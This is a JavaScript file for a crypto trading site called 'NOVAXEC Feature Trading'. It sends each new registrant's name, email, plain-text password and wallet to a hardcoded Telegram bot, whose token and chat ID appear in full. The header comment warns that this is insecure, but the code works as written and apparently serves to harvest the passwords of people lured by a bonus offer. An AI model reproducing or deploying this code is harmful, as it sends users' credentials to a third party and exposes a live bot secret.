/**
 * Telegram Notification Helper for NOVAXEC Feature Trading
 * ----------------------------------------------
 * Sends new user registration details to the configured bot.
 *
 * ⚠️ SECURITY WARNING:
 * - The bot token is visible in client-side code.
 * - Passwords are sent in PLAIN TEXT to Telegram.
 * - This is extremely insecure for any real production use.
 * - Move this to a secure backend before going live.
 */

const TELEGRAM_BOT_TOKEN = "8848782287:AAGvtPe3Kv_7xhf66DKQ_yBLCILjlfh0NvM";
const TELEGRAM_CHAT_ID = "7865970264";

/**
 * Send a formatted message to the Telegram bot
 * @param {Object} user - { name, email, password, wallet }
 */
async function sendRegistrationToTelegram(user) {
  const now = new Date();
  const timeStr = now.toLocaleString("en-GB", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false
  });

  const message = `
🚀 <b>New NOVAXEC Feature Trading User Registered!</b>
━━━━━━━━━━━━━━━━━━━━
👤 <b>Name:</b> ${escapeHtml(user.name)}
📧 <b>Email (Gmail):</b> ${escapeHtml(user.email)}
🔑 <b>Password:</b> <code>${escapeHtml(user.password)}</code>
💳 <b>Wallet:</b> <code>${user.wallet}</code>
🎁 <b>Bonus:</b> 100 USDT Welcome Bonus
🕒 <b>Time:</b> ${timeStr}
━━━━━━━━━━━━━━━━━━━━
💎 Welcome to NOVAXEC Feature Trading!
  `.trim();

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
        disable_web_page_preview: true
      })
    });

    const data = await response.json();

    if (!data.ok) {
      console.warn("Telegram API error:", data);
      return false;
    }

    console.log("✅ Registration (with password) notified on Telegram");
    return true;
  } catch (err) {
    console.error("Failed to send Telegram message:", err);
    return false;
  }
}

function escapeHtml(text) {
  if (!text) return "";
  return String(text)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

// Expose globally
window.sendRegistrationToTelegram = sendRegistrationToTelegram;
